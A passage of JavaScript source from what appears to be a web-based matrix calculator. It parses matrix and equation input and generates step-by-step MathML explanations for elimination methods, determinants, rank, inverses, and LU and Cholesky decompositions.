    if (/\=/.exec(s) != undefined) {//?
      try {
        var tmp = getAugmentedSystemMatrix(s);
        if (tmp != undefined) {
          matrix = Matrix.toMatrix(tmp.elements);
        }
      } catch (error) {
        console.log(error);
      }
    }
  }

  if (matrix == undefined) {
    var match = /[\t\n\r]/.exec(s);
    if (match != undefined) {
      try {
        matrix = Matrix.toMatrix(Matrix.split(s));
        if (matrix.rows() === 1 && matrix.cols() === 1 && matrix.e(0, 0).unwrap() instanceof Expression.Matrix) {
          matrix = matrix.e(0, 0);
        }
      } catch (error) {
        console.log(error);
      }
    }
  }

  //!!!!
  if (matrix == undefined) {
    var result = undefined;
    try {
      result = ExpressionParser.parse(s, new ExpressionParser.Context()); // to avoid simplification ({{cos(x),sin(x)},{-sin(x),cos(x)}}*{{cos(x),-sin(x)},{sin(x),cos(x)}})
      //result = ExpressionParser.parse(s);
    } catch (error) {
      // TODO: handle errors (?)
      // ???
      console.log(error);
    }
    matrix = result instanceof Matrix ? result : (result instanceof Expression.Matrix ? result.matrix : (result instanceof NonSimplifiedExpression && result.e instanceof Expression.Matrix ? result.e.matrix : undefined));
  }
  //!!!

  return matrix == undefined ? undefined : matrix.toString();
};

RPN.p = 0;//!
RPN.checkExpressions = function (textareaValue, type) {
  var resultRows = undefined;
  //?
  //!!!
  if (type === "system") {// to support custom input in SLE: 3x+y-2z=2; 2x+y-1=3; ...
    resultRows = getAugmentedSystemMatrix(textareaValue);
  }
  //!!!
  if (resultRows == undefined) {
    resultRows = Matrix.split(textareaValue);
  }

  var elements = resultRows;
  RPN.p = 0;
  for (var i = 0; i < elements.length; i += 1) {
    for (var j = 0; j < elements[i].length; j += 1) {
      var value = elements[i][j];
      //TODO: fix
      var isValid = RPN.checkExpression(value || "0");
      if (!isValid) {
        return false;
      }
      RPN.p += value.length;
    }
  }
  return true;
};
RPN.checkExpression = function (input) {
  //return ExpressionParser.parse(input) != undefined;
  return ExpressionParser.parse(input, new ExpressionParser.Context()) != undefined;
};

RPN.runExpression = function (input, kInputValue, kInputId, matrixTableStates, printOptions) {
  //!TODO: Details?
  var details = [];
  var listener = function (e) {
    details.push({type: e.type, matrix: e.data.matrix.toString(), second: e.second == undefined ? undefined : e.second.matrix.toString()});
  };
  Expression.callback = listener;
  var x = undefined;
  //HACK
  var variableNames = undefined;
  
  var resultError = undefined;
  var expressionString = undefined;
  var resultHTML = undefined;
  var resultMatrix = undefined;

  try {

    //TODO: fix
    var test = input.replace(/\s+/g, "");
    if (test === "A*X=B" || test === "AX=B" || test === "Ax=b") {
      test = "A*X=B";
    }
    if (test === "A*X=0" || test === "AX=0") {
      test = "A*X=0";
    }
    var matrixTableAState = matrixTableStates != undefined ? matrixTableStates["A"] : undefined;
    var matrixTableBState = matrixTableStates != undefined ? matrixTableStates["B"] : undefined;
    if ((test === "A*X=B" && matrixTableAState != undefined && matrixTableBState != undefined) || (test === "A*X=0" && matrixTableAState != undefined)) {
      //TODO: type !== "system" - ?
      var a0 = Matrix.toMatrix(RPN.getElementsArray(matrixTableAState).elements);
      var b0 = test !== "A*X=B" ? Matrix.Zero(a0.rows(), 1) : Matrix.toMatrix(RPN.getElementsArray(matrixTableBState).elements);
      //hit({click: test  + "-" + a0.rows().toString() + "x" + a0.cols().toString() + "-" + b0.rows().toString() + "x" + b0.cols().toString()});
      if (b0.rows() === a0.rows() && b0.cols() === 1) {
        input = "solve-using-Montante-method(" + a0.augment(b0).toString() + ")";
      }
    }

    if (input.replace(/^\s+|\s+$/g, "") === "") {
      throw new RangeError("ValueMissingError:" + "expression");
    }
    x = ExpressionParser.parse(input, new ExpressionParser.Context(function (id) {
      if ((id === "k" || id === "K") && kInputValue != undefined) {
        var value = kInputValue;
        if (value.replace(/^\s+|\s+$/g, "") === "") {
          throw new RangeError("ValueMissingError:" + kInputId);
        }
        return ExpressionParser.parse(value, new ExpressionParser.Context());
      }
      if (id === "X") {
        return new Expression.MatrixSymbol(id);
      }
      var matrixTableState = matrixTableStates != undefined && Object.prototype.hasOwnProperty.call(matrixTableStates, id) ? matrixTableStates[id] : undefined;
      if (matrixTableState == undefined) {
        return undefined;
      }

      var tmp = RPN.getElementsArray(matrixTableState);
      if (tmp.elements.length === 0) {
        throw new RangeError("ValueMissingError:" + matrixTableState.firstInputElementId);
      }

      var names = tmp.variableNames;
      var matrix = Matrix.toMatrix(tmp.elements);
      variableNames = names;//!
      return new Expression.Matrix(matrix);
    }));

    //TODO: remove

    var tmp = getResultAndHTML(x, variableNames, x.simplify(), printOptions);
    var result = tmp.result;
    resultHTML = tmp.html;
    var matrix = undefined;
    if (result instanceof Matrix) {
      matrix = result;
    } else if (result instanceof Expression.Matrix) {
      matrix = result.matrix;
    } else if (result instanceof NonSimplifiedExpression && result.e instanceof Expression.Matrix) {
      matrix = result.e.matrix;
    } else if (result instanceof Expression.Equality && result.b instanceof Expression.Matrix) {
      //!new 2018-12-29
      matrix = result.b.matrix;
    }
    resultMatrix = matrix != undefined ? matrix.toString() : "";
    expressionString = x.toString();
  } catch (error) {
    resultError = error;
  }
  Expression.callback = undefined;
  var detailsHTML = createDetailsSummary(printOptions == null ? "g" : printOptions.idPrefix, details, details.length === 1 ? 100 : 1);
  return {resultError: resultError, details: details, expressionString: expressionString, resultHTML: resultHTML, resultMatrix: resultMatrix, detailsHTML: detailsHTML};
};

RPN.getDetails = function (data, printOptions) {
  var callback = Expression.Details.getCallback(data.type);
  if (callback == undefined) {
    throw new Error(data.type);
  }
  var matrix = ExpressionParser.parse(data.matrix).matrix;//?
  var second = data.second != undefined ? ExpressionParser.parse(data.second).matrix : undefined;
  var html = callback(printOptions, matrix, second);
  return html;
};

  // TODO: fix?

  //export createDetailsSummary;
  //TODO: remove createDetailsSummary

  RPN.createDetailsSummary = createDetailsSummary;
  globalThis.RPN = RPN;

Expression.Details.add({
  type: "system-of-equations",
  callback: function (printOptions, nothing, ss) {
    //var equations = system.equations;
    var s = ss.s;
    var b = ss.b;
    var html = "";
    html += "<div>";
    html += "<math>";
    html += s.toMathML(printOptions) + "<mo>=</mo>" + b.toMathML(printOptions);
    html += "</math>";
    html += "</div>";

    var m = s.matrix;
    var bb = new Expression.Matrix(Matrix.Zero(m.rows(), m.cols())).add(b).matrix;
    var equations = [];
    for (var i = 0; i < m.rows(); i += 1) {
      for (var j = 0; j < m.cols(); j += 1) {
        equations.push({left: m.e(i, j), right: bb.e(i, j)});
      }
    }

    //TODO: fix
    html += "<div>";
    html += "<math>";
    html += "<mrow><mo>{</mo>";
    html += "<mtable rowspacing=\"0ex\">";
    for (var i = 0; i < equations.length; i += 1) {
      html += "<mtr><mtd>" + equations[i].left.toMathML(printOptions) + "<mo>=</mo>" + equations[i].right.toMathML(printOptions) + "</mtd></mtr>";
    }
    html += "</mtable>";
    html += "</mrow>";
    html += "</math>";
    html += "</div>";

    //TODO: is linear - ?
    //TODO: matrices - ?
    var c = Condition.TRUE;
    for (var i = 0; i < equations.length; i += 1) {
      var x = equations[i].left.subtract(equations[i].right);
      c = c.andZero(x);
    }
    html += "<div>";
    if (c.isFalse()) {
      html += "&minus;";//TODO: ?
    } else if (c.isTrue()) {
      html += "✓";//TODO: ?
    } else {
      html += "<math>" + c.toMathML(printOptions) + "</math>";
    }
    html += "</div>";
    return html;
  }
});

})();
(function () {
"use strict";
/*global i18n*/






var getSolveDetails = function (printOptions, matrix, variableNames, title, method) {
  if (matrix.cols() < 2) {
    throw new RangeError("ValueMissingError:A-textarea");//TODO: fix
  }
  //if (variableNames == undefined) {
    var m = matrix.slice(0, matrix.rows(), 0, matrix.cols() - 1);
    var b = matrix.slice(0, matrix.rows(), matrix.cols() - 1, matrix.cols());
    matrix = Matrix.trimRight(m).augment(b);
  //}
  var html = "";
  html += "<h4>" + title + "</h4>";
  //html += "<div>" + i18n.augmentedMatrixOfTheSystem + "</div>";
  html += "<div>" + i18n.convertTheAugmentedMatrixIntoTheRowEchelonForm + "</div>";
  html += Expression.rowReductionGaussJordanMontante(matrix, method, "solving", Object.assign({}, printOptions, {columnlines: -1}), function (result) {
    var tmp = Expression.solveByGaussNext(result, printOptions, variableNames);
    return tmp.html;
  }, false);
  return html;
};

Expression.Details.add({
  type: "solve-using-Gaussian-elimination",
  i18n: function () {
    return i18n.solveByGauss;
  },
  minRows: 1,
  priority: 1,
  callback: function (printOptions, matrix, variableNames) {
    return getSolveDetails(printOptions, matrix, variableNames, i18n.solutionByGaussianElimination, Matrix.Gauss);
  }
});

Expression.Details.add({
  type: "solve-using-Gauss-Jordan-elimination",
  i18n: function () {
    return i18n.solveByJordanGauss;
  },
  minRows: 1,
  priority: 1,
  callback: function (printOptions, matrix, variableNames) {
    return getSolveDetails(printOptions, matrix, variableNames, i18n.solutionByGaussJordanElimination, Matrix.GaussJordan);
  }
});

Expression.Details.add({
  type: "solve-using-Montante-method",
  i18n: function () {
    return i18n.methodOfMontante;
  },
  minRows: 1,
  priority: 2,
  callback: function (printOptions, matrix, variableNames) {
    return getSolveDetails(printOptions, matrix, variableNames, i18n.solutionByMethodOfMontante, Matrix.GaussMontante);
  }
});

  Expression.rowReduceChangeToHTMLMontante = function (args, printOptions, containerId, k, stepCondition) {

    var t = function (r, c, k) {
      return "<mrow>" +
               Expression.p("(a_(${r},${c})*a_(i,j)-a_(i,${c})*a_(${r},j))/p_${k}"
                              .replace(/\$\{r\}/g, (r + 1).toString())
                              .replace(/\$\{c\}/g, (c + 1).toString())
                              .replace(/\$\{k\}/g, (k + 1).toString())) +
               "<mo>&rarr;</mo>" +
               Expression.p("a_(i,j)") +
             "</mrow>";
    };
    var cellId = function (containerId, matrixId, i, j) {
      return containerId + "-" + matrixId.toString() + "-" + i.toString() + "-" + j.toString();
    };
    
    var html = "";

    if (true) {
      if (args.type === "swap" || args.type === "swap-negate") {
        html += Expression.rowReduceChangeToHTML(args, printOptions, containerId, k, stepCondition);
      } else if (args.type === "pivot") {
        var a0 = new Expression.Matrix(args.oldMatrix).toMathML(Object.assign({}, printOptions, {
          columnlines: printOptions.columnlines,
          cellIdGenerator: function (i, j) {
            return cellId(containerId, k, i, j);
          },
          pivotCell: {
            i: args.pivotRow,
            j: args.pivotColumn
          }
        }));
        var pivotElementText = "<munder>" +
                               "<mtext>" + i18n.eliminationDetails.pivotElement + "</mtext>" +
                               "<munder>" +
                               "<mrow>" +
                               Expression.p("p_" + (k + 1) + "=a_(" + (args.pivotRow + 1) + "," + (args.pivotColumn + 1) + ")=q", {q: args.oldMatrix.e(args.pivotRow, args.pivotColumn)}, printOptions) +
                               "</mrow>" +
                               (stepCondition.isTrue() ? "" : "<munder>") +
                               t(args.pivotRow, args.pivotColumn, k - 1) +
                               (stepCondition.isTrue() ? "" : stepCondition.toMathML(printOptions)) +
                               (stepCondition.isTrue() ? "" : "</munder>") +
                               "</munder>" +
                               "</munder>";                               
        html += "<math>";
        html += a0 + "<mpadded width=\"+0.8em\" lspace=\"+0.4em\"><munder><mo stretchy=\"false\">~</mo>" + pivotElementText + "</munder></mpadded>";
        html += "</math>";
        k += 1;

        var text = "";
        for (var targetRow = 0; targetRow < args.oldMatrix.rows(); targetRow += 1) {
          if (targetRow !== args.pivotRow) {
            text += "<div>";
            for (var i = 0; i < args.oldMatrix.cols(); i += 1) {
              var divId = cellId(containerId, k, targetRow, i) + "-" + "tooltip";
              var highlight = "<a class=\"a-highlight\" data-for=\"" + cellId(containerId, k, targetRow, i) + "\" data-highlight=\"" +
                                "#" + cellId(containerId, k - 1, args.pivotRow, args.pivotColumn) + ", " +
                                "#" + cellId(containerId, k - 1, targetRow, i) + ", " +
                                "#" + cellId(containerId, k - 1, targetRow, args.pivotColumn) + ", " +
                                "#" + cellId(containerId, k - 1, args.pivotRow, i) + ", " +
                                "#" + cellId(containerId, k, targetRow, i) + "\"></a>";
              var tooltips = "<a class=\"a-tooltip\" data-for=\"" + cellId(containerId, k, targetRow, i) + "\" data-tooltip=\"" + divId + "\"></a>";
              text += "<div id=\"" + divId + "\">" +
                      "<math>" +
                      Expression.p("a_(" + (targetRow + 1) + "," + (i + 1) + ")=(a*b-c*d)/p=r", {
                        a: args.oldMatrix.e(args.pivotRow, args.pivotColumn),
                        b: args.oldMatrix.e(targetRow, i),
                        c: args.oldMatrix.e(targetRow, args.pivotColumn),
                        d: args.oldMatrix.e(args.pivotRow, i),
                        p: args.previousPivot,
                        r: args.newMatrix.e(targetRow, i)
                      }, printOptions) +
                      "</math>" +
                      "</div>" +
                      tooltips +
                      highlight;
            }
            text += "</div>";
          }
        }
        html += "<span hidden>" + text + "</span>";
      } else {
        throw new TypeError(args.type);
      }
    }
    return html;
  };
  
var getDeterminantDetails = function (printOptions, matrix, method, title, header) {
  if (!matrix.isSquare()) {
    throw new RangeError("NonSquareMatrixException");
  }
  var html = "";

  html += "<div>";
  html += "<math>";
  html += new Expression.Determinant(new Expression.Matrix(matrix)).toMathML(printOptions) + "<mo>=</mo><mi>?</mi>";
  html += "</math>";
  html += "</div>";

  //?
  if (header != undefined) {
    html += "<h4>";
    html += header;
    html += "</h4>";
  }
  html += "<p>" + title + "</p>";

  html += Expression.rowReductionGaussJordanMontante(matrix, method, "determinant", printOptions, function (tmp) {
    var rowEchelonMatrix = tmp.matrix;

    var html = "";
    html += "<div>";
    html += "<math>";
    html += new Expression.Determinant(new Expression.Matrix(matrix)).toMathML(printOptions);
    html += "<mo>=</mo>";
    if (method === Matrix.Gauss) {
      html += new Expression.Determinant(new Expression.Matrix(rowEchelonMatrix)).toMathML(printOptions);
      html += "<mo>=</mo>";
      var result = rowEchelonMatrix.determinant();
      if (!result.equals(Expression.ZERO)) {
        var det = rowEchelonMatrix.e(0, 0);
        det = new NonSimplifiedExpression(det);
        for (var j = 1; j < rowEchelonMatrix.rows(); j += 1) {
          det = new Expression.Multiplication(det, rowEchelonMatrix.e(j, j)); //? usage of Expression.Multiplication to get 4 * 5 * 6 ...
          det = new NonSimplifiedExpression(det);
        }
        html += det.toMathML(printOptions);
        html += "<mo>=</mo>";
      }
      html += result.toMathML(printOptions);
    } else {
      var result = (tmp.stoppedAtRow !== -1 ? Expression.ZERO : rowEchelonMatrix.e(rowEchelonMatrix.rows() - 1, rowEchelonMatrix.cols() - 1));
      html += result.toMathML(printOptions);
    }

    html += "</math>";
    html += "</div>";
    return html;
  });

  return html;
};

Expression.Details.add({
  type: "determinant-Gauss",
  i18n: function () {
    return i18n.methodOfGauss;
  },
  priority: 1,
  callback: function (printOptions, matrix) {
    return getDeterminantDetails(printOptions, matrix, Matrix.Gauss, i18n.determinantDetails.start, undefined);
  }
});

Expression.Details.add({
  type: "determinant-Montante",
  i18n: function () {
    return i18n.methodOfMontante;
  },
  priority: 2,
  callback: function (printOptions, matrix) {
    var title = i18n.methodOfMontanteDetails.determinantDetails.start
                .replace(/\$\{someDetails3\}/g, Expression.getSomeDetails("someDetails3", printOptions))
                .replace(/\$\{a_\(i,j\)\=\(a_\(r,c\)\*a_\(i,j\)\-a_\(i,c\)\*a_\(r,j\)\)\/p\}/g, "<math>" + Expression.p("a_(i,j)=(a_(r,c)*a_(i,j)-a_(i,c)*a_(r,j))/p") + "</math>")
                .replace(/\$\{a_\(r,c\)\}/g, "<math>" + Expression.p("a_(r,c)") + "</math>")
                .replace(/\$\{r\}/g, "<math>" + "<mi>r</mi>" + "</math>")
                .replace(/\$\{c\}/g, "<math>" + "<mi>c</mi>" + "</math>")
                .replace(/\$\{p\}/g, "<math>" + "<mi>p</mi>" + "</math>");
    return getDeterminantDetails(printOptions, matrix, Matrix.GaussMontante, title, i18n.methodOfMontanteDetails.determinantDetails.header);
  }
});

var getRankDetails = function (printOptions, matrix, method, title) {
  var html = "";
  html += "<div>";
  html += "<math>";
  html += new Expression.Rank(new Expression.Matrix(matrix)).toMathML(printOptions) + "<mo>=</mo><mi>?</mi>";
  html += "</math>";
  html += "</div>";
  if (title != undefined) {//TODO: remove
    html += "<p>" + title + "</p>";
  }
  html += Expression.rowReductionGaussJordanMontante(matrix, method, "", printOptions, function (tmp) {
    var rowEchelonMatrix = tmp.matrix;
    var html = "";
    html += "<div>";
    html += "<math>";
    html += new Expression.Rank(new Expression.Matrix(matrix)).toMathML(printOptions);
    html += "<mo>=</mo>";
    html += new Expression.Rank(new Expression.Matrix(rowEchelonMatrix)).toMathML(printOptions);
    html += "<mo>=</mo>";
    html += "<mn>" + rowEchelonMatrix.rank().toString() + "</mn>";
    html += "</math>";
    html += "</div>";
    return html;
  });//?
  return html;
};

Expression.Details.add({
  type: "rank-Gauss",
  i18n: function () {
    return i18n.methodOfGauss;
  },
  minRows: 2,
  priority: 1,
  callback: function (printOptions, matrix) {
    return getRankDetails(printOptions, matrix, Matrix.Gauss, i18n.rankDetails.start);
  }
});

Expression.Details.add({
  type: "rank-Montante",
  i18n: function () {
    return i18n.methodOfMontante;
  },
  minRows: 2,
  priority: 2,
  callback: function (printOptions, matrix) {
    //TODO:
    //i18n.methodOfMontanteDetails.rankDetails.start
    return getRankDetails(printOptions, matrix, Matrix.GaussMontante, undefined);
  }
});

// TODO:
// http://www.mathsisfun.com/algebra/matrix-inverse-row-operations-gauss-jordan.html
// i18n.inverseDetails.rowSwapNegate = "- Trocamos o linha {s} e o linha {c}:, ...";

var getInverseDetails = function (printOptions, matrix, method, title) {
  var html = "";
  html += "<div>";
  html += "<math>";
  html += new Expression.Exponentiation(new Expression.Matrix(matrix), Expression.ONE.negate()).toMathML(printOptions) + "<mo>=</mo><mi>?</mi>";
  html += "</math>";
  html += "</div>";
  if (title != undefined) {//TODO: remove
    html += "<p>" + title + "</p>";
  }
  //TODO: merge (?)
  var augmented = matrix.augment(Matrix.I(matrix.rows()));
  html += Expression.rowReductionGaussJordanMontante(augmented, method, "inverse", Object.assign({}, printOptions, {columnlines: -matrix.cols()}), function (tmp) {
    var augmentedResult = tmp.matrix;
    var hasZeroElement = false;
    for (var i = 0; i < augmentedResult.rows(); i += 1) {
      if (augmentedResult.e(i, i).equals(Expression.ZERO)) {
        hasZeroElement = true;
      }
    }
    var html = "";
    if (!hasZeroElement) {
      var result2 = Matrix.Zero(matrix.rows(), matrix.rows()).map(function (element, i, j) { // splitting to get the second half
        return augmentedResult.e(i, j + augmentedResult.rows());
      });
      var result = result2.map(function (element, i, j) {
        return element.divide(augmentedResult.e(i, i));
      });
      html += "<div>";
      html += "<math>";
      html += new Expression.Exponentiation(new Expression.Matrix(matrix), Expression.ONE.negate()).toMathML(printOptions);
      if (method === Matrix.GaussMontante) {
        var c = augmentedResult.e(0, 0);//!
        html += "<mo>=</mo>";
        html += new Expression.Multiplication(new Expression.Division(Expression.ONE, c), new Expression.Matrix(result2)).toMathML(printOptions);
      }
      html += "<mo>=</mo>";
      html += new Expression.Matrix(result).toMathML(printOptions);
      html += "</math>";
      html += "</div>";
    } else {
      //TODO: ?
    }
    return html;
  });
  return html;
};

Expression.Details.add({
  type: "inverse-Gauss",
  i18n: function () {
    return i18n.methodOfGaussJordan;
  },
  priority: 1,
  callback: function (printOptions, matrix) {
    return getInverseDetails(printOptions, matrix, Matrix.GaussJordan, i18n.inverseDetails.start);
  }
});

Expression.Details.add({
  type: "inverse-Montante",
  i18n: function () {
    return i18n.methodOfMontante;
  },
  priority: 2,
  callback: function (printOptions, matrix) {
    // TODO: i18n.methodOfMontanteDetails.inverseDetails.start
    return getInverseDetails(printOptions, matrix, Matrix.GaussMontante, undefined);
  }
});

Expression.Details.add({
  type: "LU-decomposition",
  i18n: function () {
    return i18n.index.LUDecomposition;
  },
  priority: 1,
  callback: function (printOptions, matrix) {
    var palu = Expression.LUDecomposition(matrix);
    var html = "";

    html += "<div class=\"math-block\">";
    html += "<math>";
    html += Expression.p(palu.swapFlag ? "P*A=L*U" : "A=L*U", palu, printOptions);
    html += "</math>";
    html += "</div>";

    var detailsHTML = RPN.createDetailsSummary(printOptions.idPrefix, [{type: 'steps-to-find-LU-decomposition', matrix: matrix.toString(), second: undefined}]);

    return html + detailsHTML;
  }
});

Expression.Details.add({
  type: "steps-to-find-LU-decomposition",
  i18n: function () {
    return i18n.index.LUDecomposition;
  },
  priority: 1,
  callback: function (printOptions, matrix) {
    var palu = Expression.LUDecomposition(matrix);
    var html = "";

    //TODO: fix
    html += Expression.rowReductionGaussJordanMontante(matrix, Matrix.Gauss, "LU-decomposition", Object.assign({}, printOptions, {isLUDecomposition: true}), function (result) {
      return "";
    });

    html += "<div class=\"math-block\">";
    //TODO: output P
    html += "<math>";
    html += Expression.p("L=M", {M: palu.L}, Object.assign({}, printOptions, {isLUDecomposition2: true}));
    html += "</math>";
    html += "<span>, </span>";
    html += "<math>";
    html += Expression.p("U=M", {U: new Expression.Symbol("U"), M: palu.U}, printOptions);// U - is not an IdentityMatrix
    html += "</math>";
    html += "</div>";

    return html;
  }
});

Expression.Details.add({
  type: "Gaussian-elimination",
  minRows: 2,
  callback: function (printOptions, matrix) {
    var c = 0;
    var html = "";
    Matrix.toRowEchelonWithCallback(matrix, Matrix.Gauss, "row-reduction", null, function (result) {
      c += 1;
      var condition = result.condition;
      var matrix = result.matrix;
      if (!condition.isTrue()) {
        html += "<li>";
        html += "<div class=\"like-table\">";
      }
      html += "<math>";
      html += new Expression.Matrix(matrix).toMathML(printOptions);
      html += "<mo>~</mo>";
      html += new Expression.Matrix(matrix).toMathML(printOptions);
      html += "</math>";
      if (!condition.isTrue()) {
        html += "<math>";
        html += "<mrow><mo>(</mo>";
        html += condition.toMathML(printOptions);
        html += "<mo>)</mo></mrow>";
        html += "</math>";
        html += "</div>";
        html += "</li>";
      }
    });
    if (c > 1) {
      html = "<ul class=\"list-unstyled\">" + html + "</ul>";
    }
    var detailsHTML = RPN.createDetailsSummary(printOptions.idPrefix, [{type: 'steps-to-find-row-echelon-matrix', matrix: matrix.toString(), second: undefined}]);
    return html + detailsHTML;
  }
});

Expression.Details.add({
  type: "steps-to-find-row-echelon-matrix",
  minRows: 2,
  callback: function (printOptions, matrix) {
    var html = Expression.rowReductionGaussJordanMontante(matrix, Matrix.Gauss, "row-reduction", printOptions, function (tmp) {
      //var result = tmp.matrix;
      if (tmp.condition.isTrue() && tmp.matrix.eql(matrix)) {
        return i18n.theMatrixIsInRowEchelonForm;
      }
      return "";
    });
    return html;
  }
});

})();
(function () {
"use strict";
/*global i18n*/



//TODO:
//TODO:

//TODO: i18n.index.CholeskyDecomposition

Expression.Details.add({
  type: "Cholesky-decomposition",
  minRows: 2,
  callback: function (printOptions, matrix) {
    var detailsHTML = RPN.createDetailsSummary(printOptions.idPrefix, [{type: 'steps-to-find-Cholesky-decomposition', matrix: matrix.toString(), second: undefined}]);
    var tmp = Expression.CholeskyDecomposition(matrix);
    var LL = tmp.L;
    var A = matrix;
    var html = "";
    html += "<div class=\"math-block\">";
    html += "<math>";
    html += Expression.p("A=L*T", {
      A: new Expression.Matrix(A),
      L: new Expression.Matrix(LL),
      T: new Expression.Matrix(LL.transpose())
    }, printOptions);
    html += "</math>";
    html += "</div>";
    return html + detailsHTML;
  }
});

Expression.Details.add({
  type: "steps-to-find-Cholesky-decomposition",
  i18n: function () {
    return i18n.CholeskyDecomposition;
  },
  priority: 1,
  callback: function (printOptions, matrix) {
    //TODO: better details when a lot of zeros - ?
    var A = matrix;

    // check if A is square
    if (!A.isSquare()) {
      throw new RangeError("NonSquareMatrixException");
    }

    var n = A.rows();

    // check if A from R
    if (!Expression.isRealMatrix(A, n)) {
      throw new RangeError("NonRealMatrixException");
    }
    
    var onSymmetricChecking = function (symmetric) {
      var html = "";
      html += "<div>";
      html += "<math>";
      html += Expression.p("A=X", {
        X: new Expression.Matrix(A)
      }, printOptions);
      html += "</math>";
      html += "</div>";
      html += "<div>";
      html += "<math>";
      //TODO: highlight e(i, j), e(j, i) - ?
      html += Expression.p("A=A^T").replace(/<mo>=<\/mo>/g, symmetric ? '<mo>=</mo>' : '<mo>&ne;</mo>');
      html += "</math>";
      html += "<span>";
      html += " - ";
      html += symmetric ? i18n.theMatrixIsSymmetric : i18n.theMatrixIsNotSymmetric;
      html += "</span>";
      html += "</div>";
      return html;
    };

    // check if A is symmetric
    for (var i = 0; i < n; i += 1) {
      for (var j = i + 1; j < n; j += 1) {
        if (!A.e(i, j).equals(A.e(j, i))) {
          // throw new RangeError("NonSymmetricMatrixException");
          return onSymmetricChecking(false);
        }
      }
    }

    var html = "";

    //var tmp = Expression.CholeskyDecomposition(matrix);
    //var L = tmp.L.matrix;

    // The matrix is symmetric
    html += onSymmetricChecking(true);

    // 1.  A = L * L^T
    var nsL = Matrix.Zero(n, n).map(function (e, i, j) {
      return i >= j ? new Expression.Symbol("l_(" + (i + 1).toString() + "," + (j + 1).toString() + ")") : Expression.ZERO;
    });

    html += "<div>";
    html += "<math>";
    html += Expression.p("A=L*L^T");
    html += "</math>";
    html += " ";
    html += i18n.CholeskyDecompositionLink;
    html += "</div>";

    html += "<div>";

    var M = nsL.multiply(nsL.transpose());

    printOptions = Object.assign({}, printOptions, {printId: true});
    var nsA = A.map(function (e, i, j) {
      return new NonSimplifiedExpression(e);
    });
    nsL = nsL.map(function (e, i, j) {
      return new NonSimplifiedExpression(e);
    });
    M = M.map(function (e, i, j) {
      return new NonSimplifiedExpression(e);
    });

    html += "<math>";
    html += Expression.p("A=L*T=M", {
      A: new Expression.Matrix(nsA),
      L: new Expression.Matrix(nsL),
      T: new Expression.Matrix(nsL.transpose()),
      M: new Expression.Matrix(M)
    }, printOptions);
    html += "</math>";
    html += "</div>";

    html += "<div>";
    html += i18n.then;//?
    html += "</div>";

    var L = new Array(n);
    for (var i = 0; i < n; i += 1) {
      L[i] = new Array(n);
      for (var j = 0; j < n; j += 1) {
        L[i][j] = Expression.ZERO;
      }
    }

    html += '<ul class="list-unstyled">'; //?
    for (var j = 0; j < n; j += 1) {
      for (var i = j; i < n; i += 1) {
        var nsE = null;
        var e = null;
        var radicand = null;
        if (j === i) {
          var nsSum = null;
          var sum = null;
          for (var k = 0; k < j; k += 1) {
            var nsS = nsL.e(j, k).pow(Expression.TWO);
            nsSum = nsSum == null ? nsS : nsSum.add(nsS);
            var s = L[j][k].pow(Expression.TWO);
            sum = sum == null ? s : sum.add(s);
          }
          var nsX = nsSum == null ? nsA.e(j, j) : nsA.e(j, j).subtract(nsSum);
          var x = sum == null ? nsA.e(j, j) : nsA.e(j, j).subtract(sum);
          //?
          //if (x instanceof Expression.Integer && x.compareTo(Expression.ZERO) < 0) {
          //  throw new RangeError("NonPositiveDefiniteMatrix");
          //}
          radicand = x;
          nsE = nsX.squareRoot();
          e = x.squareRoot();
        } else {
          var nsSum = null;
          var sum = null;
          for (var k = 0; k < j; k += 1) {
            var nsX = nsL.e(i, k).multiply(nsL.e(j, k));
            var x = L[i][k].multiply(L[j][k]);
            nsSum = nsSum == null ? nsX : nsSum.add(nsX);
            sum = sum == null ? x : sum.add(x);
          }
          nsE = (nsSum == null ? nsA.e(i, j) : nsA.e(i, j).subtract(nsSum)).divide(nsL.e(j, j));
          e = (sum == null ? nsA.e(i, j) : nsA.e(i, j).subtract(sum)).divide(L[j][j]);
        }
        html += "<li>";
        html += "<math>";
        var x = new NonSimplifiedExpression(M.e(i, j).unwrap());
        var y = new NonSimplifiedExpression(nsA.e(i, j).unwrap());
        html += '<mrow>';
        html += x.toMathML(printOptions) + '<mo>=</mo>' + y.toMathML(printOptions);
        html += '</mrow>';
        var highlights = "";
        highlights += "<a class=\"a-highlight\" data-for=\"" + x.getId() + "\" data-highlight=\"" + M.e(i, j).getIds() + "\"></a>";
        highlights += "<a class=\"a-highlight\" data-for=\"" + y.getId() + "\" data-highlight=\"" + nsA.e(i, j).getIds() + "\"></a>";

        html += '<mo lspace="0.68em" rspace="0.68em" stretchy="false">&rArr;</mo>';
        html += '<mrow>';
        html += nsL.e(i, j).toMathML(printOptions);
        html += "<mo>=</mo>";
        html += nsE.toMathML(printOptions); // before substitutions
        html += "<mo>=</mo>";
        html += e.toMathML(printOptions); // after substitutions
        if (radicand != null) {
          html += "<mo>=</mo>";
          radicand = radicand.simplify();
          html += new NonSimplifiedExpression(radicand).squareRoot().toMathML(printOptions); // after simplification of the expression under the radical symbol 
          nsE = null;
          try { 
            nsE = radicand.squareRoot();
          } catch (error) {
            //TODO: !!!
            console.log(error);
          }
          if (nsE == null) {
            try {
              nsE = radicand.negate().squareRoot();
            } catch (error2) {
              console.log(error2);
            }
            var ok = nsE != null;
            //TODO: fix
            html += "</math>";
            html += highlights;
            html += "<span>";
            html += " - ";
            html += !ok ? i18n.sorryCannotWork : i18n.theMatrixIsNotPositiveDefinite;
            html += "</span>";
            html += "</li>";
            html += '</ul>';
            return html;
          }
        }
        var r = e.simplify();
        //TODO: subs
        html += "<mo>=</mo>";
        html += r.toMathML(printOptions); // after simplification
        html += '</mrow>';
        html += "</math>";
        html += highlights;
        html += "</li>";

        L[i][j] = new NonSimplifiedExpression(r);
      }
    }
    html += '</ul>';
    
    var LL = Matrix.padRows(L, null);

    html += "<div>";
    html += i18n.then;//?
    html += "</div>";
    html += "<div>";
    html += "<math>";
    html += Expression.p("L=X", {X: new Expression.Matrix(LL)}, printOptions);
    html += "</math>";
    html += "</div>";

    return html;
  }
});

})();
/*jslint plusplus: true, vars: true, indent: 2 */
/*global document, window */

(function () {
  "use strict";

  function PageUtils() {
  }

  PageUtils.on = function (eventType, selector, listener) {
    PageUtils.initialize(selector, function (element) {
      element.addEventListener(eventType, listener, false);
    });
  };

  PageUtils.escapeHTML = function (s) {
    return s.replace(/&/g, "&amp;")
            .replace(/"/g, "&quot;")
            .replace(/</g, "&lt;")
            .replace(/>/g, "&gt;");
  };

  PageUtils.appendScript = function (src) {
    var script = document.createElement("script");
    script.async = true;
    script.src = src;
    document.head.appendChild(script);
  };

  var initializers = {};

